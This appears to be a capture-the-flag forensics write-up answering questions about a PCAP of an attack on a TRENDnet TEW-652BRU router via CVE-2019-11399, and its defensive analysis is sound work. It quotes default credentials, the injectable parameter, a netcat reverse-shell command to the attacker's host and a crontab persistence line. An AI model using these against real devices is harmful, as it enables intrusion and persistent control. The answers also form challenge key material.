Executive Summary

This writeup details the investigation of a network security alert originating from a router, based on a provided PCAP file. The analysis focuses on identifying the attacker's methodology, exploited vulnerabilities, and key indicators of compromise (IOCs).

The incident involved an attacker exploiting a known vulnerability (CVE-2019-11399) in a TRENDnet TEW-652BRU router. Initial access was gained using default credentials (admin:admin), followed by command injection through the lanHostCfg_HostName_1.1.1.0.0 parameter on the /get_set.ccp endpoint. The attacker successfully established a reverse shell to their machine (192.168.10.2) and implemented a persistence mechanism via crontab.

Key findings include the router's IP address (192.168.10.1), the exact timestamp of the exploit, and the commands used for initial access, reverse shell establishment, and persistence. This analysis underscores the critical importance of patching, strong credential policies, and continuous network monitoring.

TEW-652BRU_1.00b12

Reasoning: Identified from HTTP traffic, specifically the User-Agent or server headers, indicating a TRENDnet router model.

3. The logs suggest unauthorized access to the router. Can you identify the username and password the attacker used to gain access?

admin:admin

Reasoning: Found within HTTP POST requests containing form data for authentication.

4. By reviewing the internal network activity, determine the IP address of the machine the attacker used to exploit the router’s firmware.

192.168.10.2

Reasoning: Determined based on the source IP of the malicious HTTP requests and the destination IP for the reverse shell connection.

5. During the analysis, you pinpoint the vulnerable endpoint used in the attack. What is the full URL of the compromised endpoint?

http://192.168.10.1/get_set.ccp

Reasoning: Identified as the target URL for the HTTP POST requests containing the exploit payload.

6. While analyzing the attacker’s payloads, which parameter was manipulated to exploit the system?

lanHostCfg_HostName_1.1.1.0.0

Reasoning: A shell command was injected into this specific parameter within the HTTP POST request body.

7. Correlating with the CVE database, identify the specific CVE the attacker used in this incident.

CVE-2019-11399

Reasoning: This CVE is associated with command injection vulnerabilities in TRENDnet TEW-652BRU routers, matching the observed exploitation technique.

8. In the exploitation phase, the attacker executed their first command on the router firmware. What was this command?

mkdir test

Reasoning: Searched for occurrences of "shell.sh" or initial commands in the PCAP's TCP streams, revealing the first executed command after the exploit.

9. To build an accurate timeline of events, identify the exact timestamp when the CVE was first exploited.

2025-01-22 14:37:59

Reasoning: This timestamp corresponds to the very first HTTP POST request to the vulnerable endpoint /get_set.ccp containing the malicious payload.

10. The attacker made several unsuccessful attempts to establish a reverse shell. Finally, they succeeded. What command did they use to successfully establish the reverse shell?

~/firmadyne/busybox nc 192.168.10.2 4444 -e /bin/sh

Reasoning: Identified by analyzing the TCP stream for the successful connection to the attacker's listening port (4444) and the command used to initiate it.

11. Using the PCAP file, determine the exact timestamp when the attacker successfully established communication with the reverse shell.

2025-01-22 14:42:25

Reasoning: This timestamp corresponds to the first packet establishing a successful connection on port 4444 from the router to the attacker's machine.

12. After establishing the reverse shell, the attacker issued a command to assess their access level. What was the first command executed?

whoami

Reasoning: Observed in the reverse shell's TCP stream as the initial command executed by the attacker to determine their user context.

13. The attacker implemented a persistence technique to maintain access. What command did they use to achieve this?

echo "@reboot /tmp/shell.sh" >> /etc/crontab

Reasoning: Found within the reverse shell's TCP stream, showing the attacker adding a cron job to execute a shell script at reboot for persistence.

Key Takeaways & Security Insights

  • •
    Patch Management: Unpatched firmware, especially on internet-facing devices like routers, creates critical vulnerabilities. Regular updates are essential to mitigate known CVEs.
  • •
    Default Credentials: The use of default usernames and passwords (admin:admin) provides an easy entry point for attackers. Strong, unique passwords should be enforced immediately upon device setup.
  • •
    Network Segmentation & Monitoring: Monitoring network traffic for unusual patterns, such as outbound connections to unknown ports (4444) or command injection attempts in HTTP POST requests, is crucial for early detection.
  • •
    Persistence Mechanisms: Attackers often establish persistence (e.g., via crontab) to maintain access even after reboots. Monitoring system configuration files and scheduled tasks for unauthorized modifications is vital.
  • •
    PCAP Analysis Skills: The ability to dissect PCAP files, filter by protocol/port, examine HTTP POST data, and follow TCP streams is fundamental for network forensics and incident response.
  • •
    Threat Intelligence: Correlating observed attack patterns with CVE databases helps in quickly identifying the specific vulnerability exploited and understanding its implications.
